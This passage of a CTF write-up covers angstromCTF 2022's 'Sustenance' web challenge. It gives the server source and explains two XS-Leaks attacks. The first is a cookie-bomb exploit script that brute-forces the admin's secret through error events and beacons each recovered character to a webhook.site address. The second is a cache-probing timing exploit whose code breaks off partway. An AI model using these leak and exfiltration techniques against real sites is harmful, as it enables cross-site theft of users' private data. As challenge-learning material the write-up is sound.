    <span class="dl">"</span><span class="s2">actf{someone_is_going_to_submit_this_out_of_desperation}</span><span class="dl">"</span><span class="p">;</span>

<span class="kd">function</span> <span class="nx">queryMiddleware</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">search</span> <span class="o">=</span>
        <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">search</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">the quick brown fox jumps over the lazy dog</span><span class="dl">"</span><span class="p">;</span>
    <span class="c1">// admin is a cool kid</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">admin</span> <span class="o">===</span> <span class="nx">adminSecret</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">search</span> <span class="o">=</span> <span class="nx">flag</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">next</span><span class="p">();</span>
<span class="p">}</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">());</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">"</span><span class="s2">index.html</span><span class="dl">"</span><span class="p">));</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/s</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">search</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">const</span> <span class="p">[</span><span class="nx">name</span><span class="p">,</span> <span class="nx">val</span><span class="p">]</span> <span class="k">of</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="nx">name</span><span class="p">,</span> <span class="nx">val</span><span class="p">,</span> <span class="p">{</span> <span class="na">httpOnly</span><span class="p">:</span> <span class="kc">true</span> <span class="p">});</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/q</span><span class="dl">"</span><span class="p">,</span> <span class="nx">queryMiddleware</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">q</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">h</span><span class="dl">"</span><span class="p">;</span> <span class="c1">// h</span>
    <span class="kd">let</span> <span class="nx">status</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">query</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">status</span> <span class="o">=</span>
            <span class="dl">"</span><span class="s2">succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance</span><span class="dl">"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">status</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">failed</span><span class="dl">"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span>
        <span class="dl">"</span><span class="s2">/?m=</span><span class="dl">"</span> <span class="o">+</span>
        <span class="nb">encodeURIComponent</span><span class="p">(</span>
            <span class="s2">`your search that took place at </span><span class="p">${</span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">()}</span><span class="s2"> has </span><span class="p">${</span><span class="nx">status</span><span class="p">}</span><span class="s2">`</span>
        <span class="p">)</span>
    <span class="p">);</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">`Server listening on port </span><span class="p">${</span><span class="nx">port</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
<span class="p">});</span>
</pre></table></code></div></div><p>Working flow:</p><ul><li><code class="language-plaintext highlighter-rouge">Set search string</code> functionality sets the ‚Äúsearch string‚Äù and placed it in your cookie.<li><code class="language-plaintext highlighter-rouge">Search string</code> functionality return the status (<code class="language-plaintext highlighter-rouge">succeeded</code>/<code class="language-plaintext highlighter-rouge">failed</code>) whether the ‚Äúsearch string‚Äù (stored in cookie) includes the string in <code class="language-plaintext highlighter-rouge">q</code> - GET parameter.</ul><p>From those things, we can obviously figure out that it is kind of <a href="https://xsleaks.dev/">XS-Leaks</a> challenge.</p><p><em>There are 2 approach for solving the challenge: Cookie bomb and Cache probing attack.</em></p><h3 id="cookie-bomb"><span class="mr-2">Cookie bomb</span><a href="#cookie-bomb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>The idea and solution came from <a href="https://brycec.me/">Strellic</a> and it is also the intended solution.</p><p>For anyone who don‚Äôt know about this attack technique, <a href="https://blog.rubiya.kr/index.php/2020/10/02/cookie-bomb/">this blog</a> will be a good reference.</p><p>We have already known that the server stored the string (if the user is admin, it will be the flag) in cookie and the response‚Äôs length in two case is difference (the successful one is longer than another). So if we make the <code class="language-plaintext highlighter-rouge">search string</code> very long but controling it to be just barely under the maximum of request header size then we can use the cookie bomb attack to trigger <a href="https://xsleaks.dev/docs/attacks/error-events/">error-event</a> with a view to figuring out whether it was successful or not.</p><p>But there is still one problem we have to deal with. As you can see, <code class="language-plaintext highlighter-rouge">SameSite</code> has not been explicitly specified, the cookie will be treated as <code class="language-plaintext highlighter-rouge">SameSite=Lax</code> so that we can‚Äôt make the admin bot visit our page and send a lot of cookie because the ‚ÄúLax‚Äù cookie can just be sent by <a href="https://www.appsecmonkey.com/blog/samesite-cookies#:~:text=Lax%20cookies%2C%20however%2C%20will%20be%20sent%20when%20navigating">those ways</a> and it have to obey the <a href="https://web.dev/same-site-same-origin/">samesite</a> rule. And @Strellic‚Äôs trick solved the problem. He used the XSS vulnerability from <code class="language-plaintext highlighter-rouge">Xtra Salty Sardines</code> challenge to exploit. Both <code class="language-plaintext highlighter-rouge">https://sustenance.web.actf.co/</code> and <code class="language-plaintext highlighter-rouge">https://xtra-salty-sardines.web.actf.co/</code> were treated as same site because of having the same <a href="https://web.dev/same-site-same-origin/#:~:text=In%20other%20words%2C%20the%20eTLD%2B1%20is%20the%20effective%20TLD%20and%20the%20part%20of%20the%20domain%20just%20before%20it">eTLD+1</a> - <code class="language-plaintext highlighter-rouge">actf.co</code>.</p><p>Here is his exploit script:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="nt">&lt;&gt;</span>'";<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">'https://sustenance.web.actf.co/s'</span> <span class="na">method=</span><span class="s">POST</span><span class="nt">&gt;&lt;input</span> <span class="na">id=</span><span class="s">f</span> <span class="nt">/&gt;&lt;input</span> <span class="na">name=</span><span class="s">search</span> <span class="na">value=</span><span class="s">a</span> <span class="nt">/&gt;&lt;/form&gt;</span>
    <span class="nt">&lt;script&gt;</span>
        <span class="kd">const</span> <span class="nx">$</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">.</span><span class="nx">bind</span><span class="p">(</span><span class="nb">document</span><span class="p">);</span>
        <span class="kd">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="p">(</span><span class="nx">ms</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="nx">ms</span><span class="p">));</span>
        <span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">stuff</span> <span class="o">=</span> <span class="k">async</span><span class="p">(</span><span class="nx">len</span> <span class="o">=</span> <span class="mi">3500</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="kd">let</span> <span class="nx">name</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">();</span>
            <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">form</span><span class="dl">"</span><span class="p">).</span><span class="nx">target</span> <span class="o">=</span> <span class="nx">name</span><span class="p">;</span>
            <span class="kd">let</span> <span class="nx">w</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="nx">name</span><span class="p">);</span>
            <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#f</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">_</span><span class="dl">"</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="nx">len</span><span class="p">);</span>
            <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#f</span><span class="dl">"</span><span class="p">).</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">i</span><span class="o">++</span><span class="p">;</span>
            <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">form</span><span class="dl">"</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
            <span class="k">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
        <span class="p">};</span>
        <span class="kd">const</span> <span class="nx">isError</span> <span class="o">=</span> <span class="k">async</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">);</span>
                <span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">url</span><span class="p">;</span>
                <span class="nx">script</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">r</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
                <span class="nx">script</span><span class="p">.</span><span class="nx">onerror</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="nx">r</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
                <span class="nb">document</span><span class="p">.</span><span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
            <span class="p">});</span>
        <span class="p">}</span>
        <span class="kd">const</span> <span class="nx">search</span> <span class="o">=</span> <span class="p">(</span><span class="nx">query</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">isError</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://sustenance.web.actf.co/q?q=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">query</span><span class="p">));</span>
        <span class="p">};</span>
        <span class="kd">const</span> <span class="nx">alphabet</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ</span><span class="dl">"</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">//webhook.site/fe29ff9f-908c-4508-9bbd-14848cf2c3f8</span><span class="dl">"</span><span class="p">;</span>
        <span class="kd">let</span> <span class="nx">known</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">actf{</span><span class="dl">"</span><span class="p">;</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="k">async</span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nb">navigator</span><span class="p">.</span><span class="nx">sendBeacon</span><span class="p">(</span><span class="nx">url</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">?load</span><span class="dl">"</span><span class="p">);</span>
            <span class="k">await</span> <span class="nb">Promise</span><span class="p">.</span><span class="nx">all</span><span class="p">([</span><span class="nx">stuff</span><span class="p">(),</span> <span class="nx">stuff</span><span class="p">(),</span> <span class="nx">stuff</span><span class="p">(),</span> <span class="nx">stuff</span><span class="p">()]);</span>
            <span class="k">await</span> <span class="nx">stuff</span><span class="p">(</span><span class="mi">1600</span><span class="p">);</span>

            <span class="nb">navigator</span><span class="p">.</span><span class="nx">sendBeacon</span><span class="p">(</span><span class="nx">url</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">?go</span><span class="dl">"</span><span class="p">);</span>
            <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">c</span> <span class="k">of</span> <span class="nx">alphabet</span><span class="p">)</span> <span class="p">{</span>
                    <span class="kd">let</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">known</span> <span class="o">+</span> <span class="nx">c</span><span class="p">;</span>
                    <span class="k">if</span> <span class="p">(</span><span class="k">await</span> <span class="nx">search</span><span class="p">(</span><span class="nx">query</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nb">navigator</span><span class="p">.</span><span class="nx">sendBeacon</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">query</span><span class="p">);</span>
                        <span class="nx">known</span> <span class="o">+=</span> <span class="nx">c</span><span class="p">;</span>
                        <span class="k">break</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">};</span>
    <span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">Promise.all()</code> was used to increase the cookie‚Äôs size slowly because sending tons of cookie in one request will get a <code class="language-plaintext highlighter-rouge">502 Bad Gateway</code> status.</p><p>One thing @Strellic didn‚Äôt indicate in his solution is the maximum size of request header. Using <code class="language-plaintext highlighter-rouge">Burp Suite</code> i noted that remote server used <code class="language-plaintext highlighter-rouge">HTTP/2 module</code> and <code class="language-plaintext highlighter-rouge">nginx</code> as web server. After spending a couple of minutes on searching, i came across <a href="https://tryhexadecimal.com/guides/http/431-request-header-fields-too-large#:~:text=of%20all%20headers.-,The%20default%20is%2016K,-%2C%20which%20means%20all">this</a> site. According to it, the maxium size is 16k in default so we can adjust the <code class="language-plaintext highlighter-rouge">len</code> in <code class="language-plaintext highlighter-rouge">stuff()</code> to make it barely under the limit.</p><p>Send payload:</p><p><img data-src="/assets/img/angstromctf2022/Sustenance/sendpayload.png" alt="send payload" data-proofer-ignore> <em>payload</em></p><p>Result: <img data-src="/assets/img/angstromctf2022/Sustenance/result.png" alt="result" data-proofer-ignore> <em>result</em></p><h3 id="cache-probing"><span class="mr-2">Cache probing</span><a href="#cache-probing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>After reading and trying a lot of exploit techniques in xs-leak wiki, I finally thought about cache probing. But in the end i think it is too complicated so i decide to skip it and wait for the writeup üòî.</p><p>You can read the original writeup from <a href="https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/">this</a> and <a href="https://blog.maple3142.net/2022/05/03/angstromctf-2022-writeups/">this blog</a>.</p><p>The idea is to abuse the cache, if the returned response is ‚Äúsucceeded‚Äù then it will be cache with the cache key <code class="language-plaintext highlighter-rouge">...?m=your search that took place at &lt;Date.now()&gt; has succed ... require sustenance</code> so we can use <code class="language-plaintext highlighter-rouge">fetch</code> with <code class="language-plaintext highlighter-rouge">cache: 'force-cache'</code> and bruteforce the <code class="language-plaintext highlighter-rouge">Date.now()</code> value to measure the response‚Äôs time. If the time is small than the ‚Äúbase time‚Äù than it is likely that the flag contains the current bruteforcing character.</p><h4 id="assuming-that-cache-partitioning-worked"><span class="mr-2">Assuming that cache partitioning worked</span><a href="#assuming-that-cache-partitioning-worked" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4></h4><p>There is still one problem we have to come over. Now, Chrome will partition its HTTP cache starting in Chrome 86 (<a href="https://developer.chrome.com/blog/http-cache-partitioning/">Gaining security and privacy by partitioning the cache</a>).</p><blockquote class="prompt-info"><div><p>With cache partitioning, cached resources will be keyed using a new ‚ÄúNetwork Isolation Key‚Äù in addition to the resource URL. The Network Isolation Key is composed of the top-level site and the current-frame site.</p></div></blockquote><p>So if you plan to place your exploit script in a page (for example it is hosted by ngrok), the cache key will be <code class="language-plaintext highlighter-rouge">(https://id.ngrok.io, https://id.ngrok.io, https://sustenance.web.actf.co/?m=...)</code> but the expected cache key should be <code class="language-plaintext highlighter-rouge">(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =...)</code> in order to make the cache shareable. By using the Strellic‚Äôs trick above, we can easily solve the problem. Beside, the cookie attribute is <code class="language-plaintext highlighter-rouge">SameSite=Lax</code> (explained above) so we have to use <code class="language-plaintext highlighter-rouge">window.open</code> for top-level navigations ortherwise the cookie won‚Äôt be sent</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
</pre><td class="rouge-code"><pre>!<span class="nt">&lt;&gt;</span>"';
<span class="nt">&lt;script&gt;</span>
<span class="c1">// to hang the connection</span>
<span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://deelay.me/20000/https://example.com</span><span class="dl">'</span><span class="p">)</span>

<span class="c1">// NOTE: we will calculate this baseline before doing the attack</span>
<span class="kd">var</span> <span class="nx">baseLine</span> <span class="o">=</span> <span class="mf">3.2</span>
<span class="kd">const</span> <span class="nx">sleep</span> <span class="o">=</span> <span class="nx">ms</span> <span class="o">=&gt;</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="nx">resolve</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">ms</span><span class="p">))</span>

<span class="nx">go</span><span class="p">()</span>
<span class="k">async</span> <span class="kd">function</span> <span class="nx">go</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">await</span> <span class="nx">calculateBaseline</span><span class="p">()</span>
  <span class="nx">main</span><span class="p">()</span>

  <span class="k">async</span> <span class="kd">function</span> <span class="nx">calculateBaseline</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">m</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span>
    <span class="kd">let</span> <span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://sustenance.web.actf.co/?m=cached_</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">m</span><span class="p">)</span>
    
    <span class="c1">// NOTE: this number can be decreased by detecting window load</span>
    <span class="k">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>
    <span class="nx">win</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
    <span class="kd">let</span> <span class="nx">total</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;=</span><span class="mi">5</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">let</span> <span class="nx">ts</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">getLoadTime</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://sustenance.web.actf.co/?m=cached_</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">m</span><span class="p">)</span>
      <span class="nx">total</span> <span class="o">+=</span> <span class="nx">ts</span>
      <span class="nx">report</span><span class="p">(</span><span class="s2">`Cached time, round: </span><span class="p">${</span><span class="nx">i</span><span class="p">}</span><span class="s2">, </span><span class="p">${</span><span class="nx">ts</span><span class="p">}</span><span class="s2">ms`</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="c1">// NOTE: 0.5 is just a random guess</span>
    <span class="nx">baseLine</span> <span class="o">=</span> <span class="p">(</span><span class="nx">total</span><span class="o">/</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="mf">0.5</span>
    <span class="nx">report</span><span class="p">(</span><span class="s2">`Baseline: </span><span class="p">${</span><span class="nx">baseLine</span><span class="p">}</span><span class="s2">`</span><span class="p">)</span>
    
    <span class="c1">// NOTE: adjust baseline, should not be more than 3 ms based on previous testing</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">baseLine</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">baseLine</span> <span class="o">=</span> <span class="mi">3</span>
    <span class="p">}</span>
    <span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;=</span><span class="mi">3</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">let</span> <span class="nx">ts</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">getLoadTime</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://sustenance.web.actf.co/?m=not_cached_</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">m</span><span class="p">)</span>
      <span class="nx">report</span><span class="p">(</span><span class="s2">`Not Cached time, round: </span><span class="p">${</span><span class="nx">i</span><span class="p">}</span><span class="s2">, </span><span class="p">${</span><span class="nx">ts</span><span class="p">}</span><span class="s2">ms`</span><span class="p">)</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="c1">// NOTE: server is quite fast so no need to set timeout</span>
  <span class="k">async</span> <span class="kd">function</span> <span class="nx">getLoadTime</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">start</span> <span class="o">=</span> <span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span>
    <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span> <span class="na">cache</span><span class="p">:</span> <span class="dl">'</span><span class="s1">force-cache</span><span class="dl">'</span><span class="p">,</span> <span class="na">mode</span><span class="p">:</span> <span class="dl">'</span><span class="s1">no-cors</span><span class="dl">'</span> <span class="p">})</span>
    <span class="k">return</span> <span class="nx">performance</span><span class="p">.</span><span class="nx">now</span><span class="p">()</span> <span class="o">-</span> <span class="nx">start</span>
  <span class="p">}</span>

  <span class="c1">// function to bruteforce the successful search</span>
  <span class="kd">function</span> <span class="nx">genSucceedUrl</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">ft</span> <span class="o">=</span> <span class="nx">t</span> <span class="o">+</span> <span class="dl">''</span>
    <span class="k">while</span><span class="p">(</span><span class="nx">ft</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="mi">13</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">ft</span> <span class="o">+=</span> <span class="dl">'</span><span class="s1">0</span><span class="dl">'</span>
    <span class="p">}</span>
    <span class="kd">const</span> <span class="nx">status</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">succeeded, but please give me sustenance if you want to be able to see your search results because I desperately require sustenance</span><span class="dl">"</span><span class="p">;</span>
    <span class="k">return</span> <span class="dl">'</span><span class="s1">https://sustenance.web.actf.co/?m=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="s2">`your search that took place at </span><span class="p">${</span><span class="nx">ft</span><span class="p">}</span><span class="s2"> has </span><span class="p">${</span><span class="nx">status</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
  <span class="p">}</span>


  <span class="k">async</span> <span class="kd">function</span> <span class="nx">isCached</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">start</span> <span class="o">=</span> <span class="o">+</span><span class="k">new</span> <span class="nb">Date</span><span class="p">()</span>
    <span class="kd">let</span> <span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">`https://sustenance.web.actf.co/q?q=`</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">str</span><span class="p">))</span>
    <span class="k">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>
    <span class="nx">win</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
    
    <span class="c1">// NOTE: base on the data collected, i should be 1~20, pretty small number</span>
    <span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;=</span><span class="mi">30</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">genSucceedUrl</span><span class="p">(</span><span class="nx">start</span> <span class="o">+</span> <span class="nx">i</span><span class="p">)</span>
      <span class="kd">let</span> <span class="nx">loadTime</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">getLoadTime</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">loadTime</span> <span class="o">&lt;=</span> <span class="nx">baseLine</span><span class="p">)</span> <span class="p">{</span>
        
        <span class="c1">// NOTE: check again to see if it really meets the condition</span>
        <span class="kd">let</span> <span class="nx">total</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">j</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nx">j</span><span class="o">&lt;=</span><span class="mi">3</span><span class="p">;</span> <span class="nx">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
          <span class="nx">total</span> <span class="o">+=</span> <span class="k">await</span> <span class="nx">getLoadTime</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="nx">total</span><span class="o">/=</span><span class="mi">3</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">total</span> <span class="o">&lt;=</span> <span class="nx">baseLine</span><span class="p">)</span> <span class="p">{</span>
